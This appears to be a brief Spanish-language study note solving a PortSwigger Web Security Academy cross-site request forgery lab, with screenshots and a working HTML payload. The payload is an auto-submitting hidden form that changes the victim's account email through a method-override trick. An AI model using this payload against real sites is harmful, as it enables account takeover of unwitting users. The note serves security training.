## Objetivo:

![[Pasted image 20240519221545.png]]

## Solucion:

![[Pasted image 20240519221658.png]]

![[Pasted image 20240519221714.png]]

```
<body>

<form action="https://0a310031036caa63800785700095003b.web-security-academy.net/my-account/change-email" method="get">

<input type="hidden" name="email" value="pwned@gmail.com" />

<input type="hidden" name="_method" value="POST" />

</form>

  

<script>

document.forms[0].submit()

</script>

</body>
```

